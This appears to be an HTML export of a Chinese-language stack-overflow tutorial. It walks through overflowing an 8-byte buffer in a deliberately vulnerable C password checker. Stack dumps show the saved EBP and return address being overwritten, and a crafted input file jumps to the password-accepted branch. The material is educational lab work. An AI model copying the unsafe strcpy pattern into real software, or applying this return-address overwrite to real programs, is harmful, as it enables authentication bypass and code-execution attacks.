@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>2.3Redirect Program Execute Flow via Overrun Return Address</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<style type="text/css">
+/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
+/* Author: Nicolas Hery - http://nicolashery.com */
+/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
+/* Source: https://github.com/nicolahery/markdownpad-github */
+
+/* RESET
+=============================================================================*/
+
+html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
+  margin: 0;
+  padding: 0;
+  border: 0;
+}
+
+/* BODY
+=============================================================================*/
+
+body {
+  font-family: Helvetica, arial, freesans, clean, sans-serif;
+  font-size: 14px;
+  line-height: 1.6;
+  color: #333;
+  background-color: #fff;
+  padding: 20px;
+  max-width: 960px;
+  margin: 0 auto;
+}
+
+body>*:first-child {
+  margin-top: 0 !important;
+}
+
+body>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+/* BLOCKS
+=============================================================================*/
+
+p, blockquote, ul, ol, dl, table, pre {
+  margin: 15px 0;
+}
+
+/* HEADERS
+=============================================================================*/
+
+h1, h2, h3, h4, h5, h6 {
+  margin: 20px 0 10px;
+  padding: 0;
+  font-weight: bold;
+  -webkit-font-smoothing: antialiased;
+}
+
+h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
+  font-size: inherit;
+}
+
+h1 {
+  font-size: 28px;
+  color: #000;
+}
+
+h2 {
+  font-size: 24px;
+  border-bottom: 1px solid #ccc;
+  color: #000;
+}
+
+h3 {
+  font-size: 18px;
+}
+
+h4 {
+  font-size: 16px;
+}
+
+h5 {
+  font-size: 14px;
+}
+
+h6 {
+  color: #777;
+  font-size: 14px;
+}
+
+body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
+  margin-top: 10px;
+}
+
+/* LINKS
+=============================================================================*/
+
+a {
+  color: #4183C4;
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+/* LISTS
+=============================================================================*/
+
+ul, ol {
+  padding-left: 30px;
+}
+
+ul li > :first-child, 
+ol li > :first-child, 
+ul li ul:first-of-type, 
+ol li ol:first-of-type, 
+ul li ol:first-of-type, 
+ol li ul:first-of-type {
+  margin-top: 0px;
+}
+
+ul ul, ul ol, ol ol, ol ul {
+  margin-bottom: 0;
+}
+
+dl {
+  padding: 0;
+}
+
+dl dt {
+  font-size: 14px;
+  font-weight: bold;
+  font-style: italic;
+  padding: 0;
+  margin: 15px 0 5px;
+}
+
+dl dt:first-child {
+  padding: 0;
+}
+
+dl dt>:first-child {
+  margin-top: 0px;
+}
+
+dl dt>:last-child {
+  margin-bottom: 0px;
+}
+
+dl dd {
+  margin: 0 0 15px;
+  padding: 0 15px;
+}
+
+dl dd>:first-child {
+  margin-top: 0px;
+}
+
+dl dd>:last-child {
+  margin-bottom: 0px;
+}
+
+/* CODE
+=============================================================================*/
+
+pre, code, tt {
+  font-size: 12px;
+  font-family: Consolas, "Liberation Mono", Courier, monospace;
+}
+
+code, tt {
+  margin: 0 0px;
+  padding: 0px 0px;
+  white-space: nowrap;
+  border: 1px solid #eaeaea;
+  background-color: #f8f8f8;
+  border-radius: 3px;
+}
+
+pre>code {
+  margin: 0;
+  padding: 0;
+  white-space: pre;
+  border: none;
+  background: transparent;
+}
+
+pre {
+  background-color: #f8f8f8;
+  border: 1px solid #ccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px;
+}
+
+pre code, pre tt {
+  background-color: transparent;
+  border: none;
+}
+
+kbd {
+    -moz-border-bottom-colors: none;
+    -moz-border-left-colors: none;
+    -moz-border-right-colors: none;
+    -moz-border-top-colors: none;
+    background-color: #DDDDDD;
+    background-image: linear-gradient(#F1F1F1, #DDDDDD);
+    background-repeat: repeat-x;
+    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
+    border-image: none;
+    border-radius: 2px 2px 2px 2px;
+    border-style: solid;
+    border-width: 1px;
+    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+    line-height: 10px;
+    padding: 1px 4px;
+}
+
+/* QUOTES
+=============================================================================*/
+
+blockquote {
+  border-left: 4px solid #DDD;
+  padding: 0 15px;
+  color: #777;
+}
+
+blockquote>:first-child {
+  margin-top: 0px;
+}
+
+blockquote>:last-child {
+  margin-bottom: 0px;
+}
+
+/* HORIZONTAL RULES
+=============================================================================*/
+
+hr {
+  clear: both;
+  margin: 15px 0;
+  height: 0px;
+  overflow: hidden;
+  border: none;
+  background: transparent;
+  border-bottom: 4px solid #ddd;
+  padding: 0;
+}
+
+/* TABLES
+=============================================================================*/
+
+table th {
+  font-weight: bold;
+}
+
+table th, table td {
+  border: 1px solid #ccc;
+  padding: 6px 13px;
+}
+
+table tr {
+  border-top: 1px solid #ccc;
+  background-color: #fff;
+}
+
+table tr:nth-child(2n) {
+  background-color: #f8f8f8;
+}
+
+/* IMAGES
+=============================================================================*/
+
+img {
+  max-width: 100%
+}
+</style>
+<style type="text/css">
+.highlight  { background: #ffffff; }
+.highlight .c { color: #999988; font-style: italic } /* Comment */
+.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
+.highlight .k { font-weight: bold } /* Keyword */
+.highlight .o { font-weight: bold } /* Operator */
+.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
+.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
+.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
+.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
+.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
+.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
+.highlight .ge { font-style: italic } /* Generic.Emph */
+.highlight .gr { color: #aa0000 } /* Generic.Error */
+.highlight .gh { color: #999999 } /* Generic.Heading */
+.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
+.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
+.highlight .go { color: #888888 } /* Generic.Output */
+.highlight .gp { color: #555555 } /* Generic.Prompt */
+.highlight .gs { font-weight: bold } /* Generic.Strong */
+.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
+.highlight .gt { color: #aa0000 } /* Generic.Traceback */
+.highlight .kc { font-weight: bold } /* Keyword.Constant */
+.highlight .kd { font-weight: bold } /* Keyword.Declaration */
+.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
+.highlight .kr { font-weight: bold } /* Keyword.Reserved */
+.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
+.highlight .m { color: #009999 } /* Literal.Number */
+.highlight .s { color: #d14 } /* Literal.String */
+.highlight .na { color: #008080 } /* Name.Attribute */
+.highlight .nb { color: #0086B3 } /* Name.Builtin */
+.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
+.highlight .no { color: #008080 } /* Name.Constant */
+.highlight .ni { color: #800080 } /* Name.Entity */
+.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
+.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
+.highlight .nn { color: #555555 } /* Name.Namespace */
+.highlight .nt { color: #000080 } /* Name.Tag */
+.highlight .nv { color: #008080 } /* Name.Variable */
+.highlight .ow { font-weight: bold } /* Operator.Word */
+.highlight .w { color: #bbbbbb } /* Text.Whitespace */
+.highlight .mf { color: #009999 } /* Literal.Number.Float */
+.highlight .mh { color: #009999 } /* Literal.Number.Hex */
+.highlight .mi { color: #009999 } /* Literal.Number.Integer */
+.highlight .mo { color: #009999 } /* Literal.Number.Oct */
+.highlight .sb { color: #d14 } /* Literal.String.Backtick */
+.highlight .sc { color: #d14 } /* Literal.String.Char */
+.highlight .sd { color: #d14 } /* Literal.String.Doc */
+.highlight .s2 { color: #d14 } /* Literal.String.Double */
+.highlight .se { color: #d14 } /* Literal.String.Escape */
+.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
+.highlight .si { color: #d14 } /* Literal.String.Interpol */
+.highlight .sx { color: #d14 } /* Literal.String.Other */
+.highlight .sr { color: #009926 } /* Literal.String.Regex */
+.highlight .s1 { color: #d14 } /* Literal.String.Single */
+.highlight .ss { color: #990073 } /* Literal.String.Symbol */
+.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
+.highlight .vc { color: #008080 } /* Name.Variable.Class */
+.highlight .vg { color: #008080 } /* Name.Variable.Global */
+.highlight .vi { color: #008080 } /* Name.Variable.Instance */
+.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
+.pl-c {
+    color: #969896;
+}
+
+.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
+    color: #0086b3;
+}
+
+.pl-e,.pl-en {
+    color: #795da3;
+}
+
+.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
+    color: #333;
+}
+
+.pl-ent {
+    color: #63a35c;
+}
+
+.pl-k,.pl-s,.pl-st {
+    color: #a71d5d;
+}
+
+.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
+    color: #df5000;
+}
+
+.pl-id {
+    color: #b52a1d;
+}
+
+.pl-ii {
+    background-color: #b52a1d;
+    color: #f8f8f8;
+}
+
+.pl-sr .pl-cce {
+    color: #63a35c;
+    font-weight: bold;
+}
+
+.pl-ml {
+    color: #693a17;
+}
+
+.pl-mh,.pl-mh .pl-en,.pl-ms {
+    color: #1d3e81;
+    font-weight: bold;
+}
+
+.pl-mq {
+    color: #008080;
+}
+
+.pl-mi {
+    color: #333;
+    font-style: italic;
+}
+
+.pl-mb {
+    color: #333;
+    font-weight: bold;
+}
+
+.pl-md,.pl-mdhf {
+    background-color: #ffecec;
+    color: #bd2c00;
+}
+
+.pl-mdht,.pl-mi1 {
+    background-color: #eaffea;
+    color: #55a532;
+}
+
+.pl-mdr {
+    color: #795da3;
+    font-weight: bold;
+}
+
+.pl-mo {
+    color: #1d3e81;
+}
+.task-list {
+padding-left:10px;
+margin-bottom:0;
+}
+
+.task-list li {
+    margin-left: 20px;
+}
+
+.task-list-item {
+list-style-type:none;
+padding-left:10px;
+}
+
+.task-list-item label {
+font-weight:400;
+}
+
+.task-list-item.enabled label {
+cursor:pointer;
+}
+
+.task-list-item+.task-list-item {
+margin-top:3px;
+}
+
+.task-list-item-checkbox {
+display:inline-block;
+margin-left:-20px;
+margin-right:3px;
+vertical-align:1px;
+}
+</style>
+</head>
+<body>
+<h1 id="redirect-program-execute-flow-via-overrun-return-address">Redirect Program Execute Flow via Overrun Return Address</h1>
+<p><strong>Author：wnagzihxain<br>Mail：tudouboom@163.com<br>Site：www.wangzhixian.org<br>Create Time：2016.02.21
+</strong></p>
+<pre><code>#include &lt;stdio.h&gt;
+
+#define PASSWORD &quot;1234567&quot;
+
+int verify_password (char *password)
+{
+    int authenticated;
+    char buffer[8];// add local buff
+    authenticated = strcmp(password, PASSWORD);
+    strcpy(buffer, password);//over flowed here!    
+    return authenticated;
+}
+
+int main(int argc, char **argv, char **envp)
+{
+    int valid_flag = 0;
+    char password[1024];
+    while(1)
+    {
+        printf(&quot;please input password:       &quot;);
+        scanf(&quot;%s&quot;, password);
+        valid_flag = verify_password(password);
+        if(valid_flag)
+        {
+            printf(&quot;incorrect password!\n\n&quot;);
+        }
+        else
+        {
+            printf(&quot;Congratulation! You have passed the verification!\n&quot;);
+            break;
+        }
+    }
+    system(&quot;pause&quot;);
+    return 0;
+}
+</code></pre><p>依照上次，在调用strcpy的时候下断点，注意栈里数据的变化</p>
+<p><img src="Image/1.png" alt=""></p>
+<pre><code>0012FB18   CCCCCCCC  烫烫
+0012FB1C   CCCCCCCC  烫烫
+0012FB20   00000001  ...
+0012FB24  /0012FF80  €.
+0012FB28  |004010EB  ?@.   返回到 stack_ov.004010EB 来自 stack_ov.00401005
+</code></pre><p>七个q已经赋值给字符串</p>
+<p><img src="Image/2.png" alt=""></p>
+<p>修改一下，在strcpy的下一句汇编代码下断点</p>
+<p>11个字符：&quot;abcdefjhijk&quot;</p>
+<p><img src="Image/3.png" alt=""></p>
+<p>观察栈里的变化，可以看到authenticated变量已经被覆盖掉了</p>
+<pre><code>0012FB14   CCCCCCCC  烫烫
+0012FB18   64636261  abcd
+0012FB1C   686A6665  efjh
+0012FB20   006B6A69  ijk.
+0012FB24  /0012FF80  € .
+0012FB28  |004010EB  ?@.   返回到 stack_ov.004010EB 来自 stack_ov.00401005
+0012FB2C  |0012FB7C  |?.   ASCII &quot;abcdefjhijk&quot;
+0012FB30  |0012B87C  |?.
+</code></pre><p>15个字符：&quot;abcdefjhijklmno&quot;</p>
+<p><img src="Image/4.png" alt=""></p>
+<p>覆盖掉了前栈帧的EBP</p>
+<pre><code>0012FB14   CCCCCCCC  烫烫
+0012FB18   64636261  abcd
+0012FB1C   686A6665  efjh
+0012FB20   6C6B6A69  ijkl
+0012FB24   006F6E6D  mno.
+0012FB28   004010EB  ?@.   返回到 stack_ov.004010EB 来自 stack_ov.00401005
+0012FB2C   0012FB7C  |?.   ASCII &quot;abcdefjhijklmno&quot;
+0012FB30   0012B74C  L?.
+</code></pre><p>19个字符：&quot;abcdefjhijklmnopqrs&quot;</p>
+<p><img src="Image/5.png" alt=""></p>
+<p>覆盖掉了返回地址</p>
+<pre><code>0012FB14   CCCCCCCC  烫烫
+0012FB18   64636261  abcd
+0012FB1C   686A6665  efjh
+0012FB20   6C6B6A69  ijkl
+0012FB24   706F6E6D  mnop
+0012FB28   00737271  qrs.
+0012FB2C   0012FB7C  |?.   ASCII &quot;abcdefjhijklmnopqrs&quot;
+0012FB30   0012B74C  L?.
+</code></pre><p>接着F8单步走，走到pop ebp的时候，注意寄存器窗口的变化，EBP已经被我们控制了</p>
+<p><img src="Image/6.png" alt=""></p>
+<p>此时寄存器的值</p>
+<pre><code>EAX 6C6B6A69
+ECX 0012FB90 ASCII CC,&quot;烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫&quot;
+EDX 00737271
+EBX 7FFDF000
+ESP 0012FB24 ASCII &quot;mnopqrs&quot;
+EBP 0012FB24 ASCII &quot;mnopqrs&quot;
+ESI 0012B77C
+EDI 0012FF80
+EIP 0040106E stack_ov.0040106E
+</code></pre><p>F8单步走，继续观察寄存器窗口的变化</p>
+<p><img src="Image/7.png" alt=""></p>
+<p>EBP已经变成了我们控制的值，然后注意EIP的值</p>
+<pre><code>EAX 6C6B6A69
+ECX 0012FB90 ASCII CC,&quot;烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫&quot;
+EDX 00737271
+EBX 7FFDF000
+ESP 0012FB28 ASCII &quot;qrs&quot;
+EBP 706F6E6D
+ESI 0012B77C
+EDI 0012FF80
+EIP 0040106F stack_ov.0040106F
+</code></pre><p>F8单步走下去</p>
+<p>跳到了不知道什么地方的地方</p>
+<p><img src="Image/8.png" alt=""></p>
+<p>看EIP寄存器，也变成了我们控制的值</p>
+<pre><code>EAX 6C6B6A69
+ECX 0012FB90 ASCII CC,&quot;烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫&quot;
+EDX 00737271
+EBX 7FFDF000
+ESP 0012FB2C
+EBP 706F6E6D
+ESI 0012B77C
+EDI 0012FF80
+EIP 00737271
+</code></pre><p>好了分析完了溢出后寄存器的变化以及程序运行过程，现在修改一下代码</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+#define PASSWORD &quot;1234567&quot;
+
+int verify_password (char *password)
+{
+    int authenticated;
+    char buffer[8];
+    authenticated = strcmp(password, PASSWORD);
+    strcpy(buffer, password);//over flowed here!    
+    return authenticated;
+}
+
+int main()
+{
+    int valid_flag=0;
+    char password[1024];
+    FILE * fp;
+    if(!(fp = fopen(&quot;password.txt&quot;, &quot;rw+&quot;)))
+    {
+        exit(0);
+    }
+    fscanf(fp, &quot;%s&quot;, password);
+    valid_flag = verify_password(password);
+    if(valid_flag)
+    {
+        printf(&quot;incorrect password!\n&quot;);
+    }
+    else
+    {
+        printf(&quot;Congratulation! You have passed the verification!\n&quot;);
+    }
+    fclose(fp);
+    system(&quot;pause&quot;);
+    return 0;
+}
+</code></pre><p>小改了下代码，然后在程序同文件夹下创建一个txt，写入&quot;1234567&quot;</p>
+<p>F8单步走下来，找到main函数入口，至于怎么找入口。。。。。。三个压栈操作下面就是了</p>
+<p><img src="Image/9.png" alt=""></p>
+<p>F7跟进去，这是main函数领空，F8继续单步，先找到verify_password ()的入口， F8运行，断在这</p>
+<p><img src="Image/10.png" alt=""></p>
+<p>同时拉下来看下面的汇编代码，找到密码验证成功的代码，地址是0040111F</p>
+<pre><code>0040110E  |. /74 0F         je short stack_ov.0040111F
+00401110  |. |68 70804200   push offset stack_ov.??_C@_0BF@IIFN@incorrect?5password?&gt;;  ASCII &quot;incorrect password!\n&quot;
+00401115  |. |E8 36040000   call stack_ov.printfgvdbgnnd_blockeressges
+0040111A  |. |83C4 04       add esp,0x4
+0040111D  |. |EB 0D         jmp short stack_ov.0040112C
+0040111F  |&gt; \68 30804200   push offset stack_ov.??_C@_0DD@FPBB@Congratulation?$CB?5&gt;
+;  ASCII &quot;Congratulation! You have passed the verification!\n&quot;
+00401124  |.  E8 27040000   call stack_ov.printfgvdbgnnd_blockeressges
+</code></pre><p>记下来，然后F7跟入verify_password ()，然后F8单步走到如下位置，观察栈以及寄存器的数据</p>
+<p><img src="Image/11.png" alt=""></p>
+<p>F8单步，在此处下断点，后面运行的时候需要用</p>
+<p><img src="Image/12.png" alt=""></p>
+<p>根据以前的分析，可以确定各变量在栈里所在位置</p>
+<pre><code>0012FB14   34333231  1234
+0012FB18   00373635  567.
+0012FB1C   00000000  ....
+0012FB20  /0012FF80  € .
+0012FB24  |00401104    @.  返回到 stack_ov.mainshort_argingAblock_pages+74 来自 stack_ov.00401005
+0012FB28  |0012FB7C  |?.   ASCII &quot;1234567&quot;
+0012FB2C  |0012B74C  L?.
+0012FB30  |0012B77C  |?.
+</code></pre><p>现在来构造数据，任意16进制编辑器都可以，因为刚刚找到了密码验证正确的跳转地址</p>
+<p>而且如果以“4321”为一组的话，覆盖返回地址刚好在第5组，返回地址在0040111F</p>
+<p>根据数据在内存里的排列顺序，输入要倒着来也就是1F 11 40 00</p>
+<p><img src="Image/13.png" alt=""></p>
+<p>运行，刚刚下的断点就是为了这里用的</p>
+<p><img src="Image/14.png" alt=""></p>
+<p>栈里的数据，可以看到成功的覆盖掉了</p>
+<pre><code>0012FB14   31323334  4321
+0012FB18   31323334  4321
+0012FB1C   31323334  4321
+0012FB20   31323334  4321
+0012FB24   0040111F  ¬ @.  stack_ov.0040111F
+0012FB28   0012FB7C  |?.
+0012FB2C   0012B74C  L?.
+0012FB30   0012B77C  |?.
+</code></pre><p>F9继续运行，成功跳到了密码验证正确的if分支，因为堆栈不平衡，所以程序崩溃了</p>
+<p><img src="Image/15.png" alt=""></p>
+
+</body>
+</html>
+<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
